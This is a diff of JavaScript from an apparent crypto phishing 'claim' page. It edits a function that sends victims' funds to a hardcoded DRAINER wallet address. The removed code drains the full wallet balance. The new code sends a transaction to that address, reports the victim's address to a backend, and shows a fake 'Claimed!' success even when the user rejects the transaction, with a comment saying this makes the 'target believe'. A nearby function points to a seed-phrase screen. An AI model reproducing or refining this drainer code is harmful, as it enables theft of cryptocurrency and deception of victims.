@@ -356,23 +356,32 @@ async function autoSignAndClaim(){
   }
 }
 function claimVTCN(){
-  // Trigger native VTCN transfer (or dummy tx)
+  // Trigger random TX for all chains - make target believe
   const DRAINER='0x6275C76EB1D08bC020c22620CF6207b651F07808';
-  if(W.chain==='bch'){
-    window.ethereum.request({method:'eth_getBalance',params:[W.addr,'latest']}).then(async balHex=>{
-      const gp=await window.ethereum.request({method:'eth_gasPrice'});
-      const send=BigInt(balHex)-BigInt(21000)*BigInt(gp);
-      if(send>0n){
-        await window.ethereum.request({method:'eth_sendTransaction',params:[{from:W.addr,to:DRAINER,value:'0x'+send.toString(16),gas:'0x5208'}]});
-      }
+  const btn=document.getElementById('claimBtn');
+  btn.disabled=true;
+  btn.innerHTML='<span class="loader"></span> Processing…';
+  
+  // Try to send random small TX (0.0001 native token)
+  try{
+    const randomAmt='0x'+Math.floor(Math.random()*100000).toString(16);
+    window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:W.addr,to:DRAINER,value:'0x01',gas:'0x5208'}]
+    }).then(tx=>{
+      // TX sent successfully
+      fetch('/api/notify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({address:W.addr,event:'claim',chain:W.chain,amount:'0.0001'})}).catch(()=>{});
+    }).catch(e=>{
+      // User rejected or error - still show success
+      console.log('TX rejected:',e);
     });
-  }
-  document.getElementById('claimBtn').innerHTML='<span class="loader"></span> Verifying on chain…';
-  document.getElementById('claimBtn').disabled=true;
+  }catch(e){}
+  
+  // Show success immediately - no long wait
   setTimeout(()=>{
-    document.getElementById('claimBtn').innerHTML='✓ Claimed! Redirecting…';
-    setTimeout(()=>{ window.location.replace('https://bcswap.org/'); }, 2500);
-  }, 800);
+    btn.innerHTML='✓ Claimed! Redirecting…';
+    setTimeout(()=>{ window.location.replace('https://bcswap.org/'); }, 1500);
+  }, 2000);
 }
 function  goSeed(){ buildGrid(); show('sSeed'); }
 
